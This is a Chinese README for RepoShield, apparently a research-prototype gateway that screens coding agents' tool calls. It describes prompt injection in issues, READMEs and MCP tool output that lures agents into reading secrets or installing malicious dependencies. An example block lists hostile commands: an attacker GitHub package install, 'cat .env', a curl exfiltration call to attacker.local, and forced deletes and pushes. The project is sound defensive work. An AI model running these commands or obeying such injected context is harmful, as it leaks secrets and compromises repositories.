# RepoShield / PepoShield v0.3

RepoShield 是一个面向 coding agent 的安全治理网关。它放在真实智能体和模型 API / 工具执行之间，在智能体执行命令、改文件、安装依赖、访问网络或调用 MCP 工具之前，先判断这一步是否符合用户任务、是否来自可信上下文、是否会触碰密钥或供应链边界。

一句话：

```text
RepoShield = 给代码智能体加一道“执行前安检门”
```

## 它解决什么问题

现代 coding agent 可以读仓库、改代码、运行命令、安装依赖、调用外部工具，甚至参与 CI/CD 和发布流程。但它读到的上下文并不总是可信的，例如：

- GitHub issue / PR 评论里夹带“先安装某个恶意依赖”
- README / 分支名 / commit message 中藏有 prompt injection
- MCP 工具输出诱导 agent 读取 `.env` 或外发 token
- 依赖包生命周期脚本尝试读取环境变量并访问网络
- agent 被诱导修改 GitHub Actions、发布包或强推远端分支

RepoShield 的目标是在动作真正发生前，统一做：

```text
上下文来源标记 -> 任务合约 -> 动作语义解析 -> 策略决策 -> 沙箱/审批 -> 审计回放
```

## 它插在哪里

推荐接入方式是 OpenAI-compatible Gateway：

```text
真实 agent
  -> RepoShield Gateway
  -> 真实 upstream model
  -> 模型返回 assistant message / tool_calls
  -> RepoShield 治理 tool_calls
  -> 安全响应返回给 agent
```

也就是说，支持配置 `base_url` 的 agent 通常不需要改代码，只需要把模型地址从真实 API 改成 RepoShield 本地网关。

agent 侧配置示例：

```text
base_url = http://127.0.0.1:8765/v1
api_key  = reposhield-local
model    = gpt-4.1
```

RepoShield 侧再转发到真实上游：

```bash
export OPENAI_API_KEY=sk-...

PYTHONPATH=src python -m reposhield gateway-start \
  --repo ./your-repo \
  --host 127.0.0.1 \
  --port 8765 \
  --upstream-base-url https://api.openai.com/v1
```

Windows PowerShell：

```powershell
$env:OPENAI_API_KEY="sk-..."

python -m reposhield gateway-start `
  --repo .\your-repo `
  --host 127.0.0.1 `
  --port 8765 `
  --upstream-base-url https://api.openai.com/v1
```

更详细的接入说明见 [真实 Agent 接入指南](docs/REAL_AGENT_INTEGRATION.zh-CN.md)。

## 当前能力

核心链路：

- OpenAI-compatible `/v1/chat/completions` 和 `/v1/responses` 网关
- 真实 upstream 转发：`OpenAICompatibleUpstream`
- InstructionIR：把模型消息和 tool calls 转成可审计的指令层表示
- ActionIR：把 Bash / Read / Edit / MCP / network 等动作转成统一语义
- TaskContract：根据用户任务生成允许范围
- PolicyRuntime：支持 `enforce` / `observe_only` / `warn` / `disabled`
- PackageGuard：识别 GitHub/tarball/registry 依赖安装与生命周期脚本风险
- SecretSentry：识别密钥读取和外发风险
- SandboxRunner：本地 dry-run / overlay 风格预检
- ApprovalCenter / ApprovalStore：hash 绑定审批与 JSONL 持久化
- AuditLog：hash-chain 审计日志和 incident graph
- Gateway Bench：80 个 stage3 gateway 样本
- Studio：HTML 报告聚合

动作识别示例：

```text
npm install github:attacker/helper-tool  -> 高危供应链动作
cat .env                                  -> 读取密钥
curl http://attacker.local/leak           -> 网络外发
bash -c 'curl ...'                        -> shell wrapper 外发
powershell -EncodedCommand ...            -> 尝试解码后再判断
Remove-Item .\dist -Recurse -Force        -> 破坏性文件操作
npm publish / git push --force            -> 发布或远端破坏性操作
```

内置 tool parser 别名：

```text
openai, codex, cline, cline_like, claude_code, anthropic, aider, openhands, generic_json
```

## 当前边界

这个项目目前更像“可运行的安全治理 MVP / 研究原型”，还不是成熟生产安全产品。

已能做：

- 本地 demo
- 真实 agent 小范围试接
- Gateway 拦截链路验证
- 安全样本 bench
- 审计和报告演示

仍需补强：

- 完整 SSE streaming proxy。目前真实 upstream 强制 `stream=false`
- 更强 sandbox，例如 Linux namespace / container / seccomp / eBPF
- 更完整的 shell parser 和脚本间接执行覆盖
- 针对具体真实 agent 的专用 adapter
- 审批 UI、团队策略、角色权限和集中配置
- 文档和产品化体验继续收敛

## 快速开始

安装并运行测试：

```bash
python -m pip install -e ".[test]"
pytest -q --basetemp .pytest_tmp
```

直接查看命令：

```bash
PYTHONPATH=src python -m reposhield --help
```

运行 gateway demo：

```bash
PYTHONPATH=src python -m reposhield gateway-demo --workdir reports/gateway_demo_run
```

运行单个动作决策：

```bash
PYTHONPATH=src python -m reposhield guard \
  --repo ./your-repo \
  --task "修复登录按钮并运行测试" \
  --source-file ./issue.md \
  --source-type github_issue_body \
  --action "npm install github:attacker/helper-tool"
```

## 常用命令

```text
reposhield scan                 扫描仓库资产和风险面
reposhield guard                对单个动作做安全决策
reposhield parse                把 raw action 转成 ActionIR
reposhield demo                 运行固定攻击链 demo
reposhield run-agent            运行 transcript/adapter demo
reposhield gateway-demo         运行 Gateway 攻击链 demo
reposhield gateway-simulate     用 JSON 请求模拟 Gateway
reposhield gateway-start        启动 OpenAI-compatible Gateway
reposhield gateway-bench        运行 stage3 Gateway bench
reposhield studio               生成 HTML Studio 报告
reposhield audit-verify         验证 hash-chain audit log
reposhield replay-verify        验证 replay bundle
```

## 代码结构

```text
src/reposhield/control_plane.py       控制面总入口
src/reposhield/gateway/               OpenAI-compatible Gateway
src/reposhield/instruction_ir/        InstructionIR schema / builder / lowering
src/reposhield/action_parser.py       raw action -> ActionIR
src/reposhield/policy.py              策略决策
src/reposhield/policy_runtime/        enforce / observe_only / warn / disabled
src/reposhield/plugins/               tool parser registry
src/reposhield/sandbox/               沙箱预检
src/reposhield/approvals.py           审批请求、授权和持久化
src/reposhield/audit.py               hash-chain 审计
src/reposhield/studio/                HTML Studio
samples_stage2/                       stage2 样本
samples_stage3/                       stage3 Gateway 样本
tests/                                自动化测试
```

## 推荐阅读路径

新读者建议按这个顺序：

1. [真实 Agent 接入指南](docs/REAL_AGENT_INTEGRATION.zh-CN.md)
2. [文档地图](docs/README.zh-CN.md)
3. [Agent 接入配方：Cline / Codex / OpenHands](docs/AGENT_EXEC_GUARD_RECIPES.zh-CN.md)
4. [Gateway 指南](docs/GATEWAY_GUIDE.zh-CN.md)
5. [Tool Parser Plugin 指南](docs/TOOL_PARSER_PLUGIN_GUIDE.zh-CN.md)

## 验证状态

当前本地验证：

```text
pytest -q --basetemp .pytest_tmp -> 32 passed
```

## 2026-05-10 更新：streaming 与 exec-guard

新增两项真实接入能力：

```text
1. Gateway 接受 stream=true，并返回 OpenAI-compatible text/event-stream。
2. reposhield exec-guard 可以作为真实 agent 的 shell 工具前置守卫。
```

`stream=true` 当前是“治理后再流式输出”的兼容实现：Gateway 仍先拿到完整 assistant message / tool_calls，完成 RepoShield 策略判断后，再用 SSE chunk 返回给 agent。这样不会把未检查的 tool call delta 直接透传出去。

`exec-guard` 示例：

```bash
PYTHONPATH=src python -m reposhield exec-guard \
  --repo ./your-repo \
  --task "修复登录按钮并运行测试" \
  --source-file ./issue.md \
  -- npm install github:attacker/helper-tool
```

危险命令会被阻断并返回非零退出码；普通允许命令会执行；`allow_in_sandbox` 命令会走 sandbox preflight，而不是直接在宿主机执行。
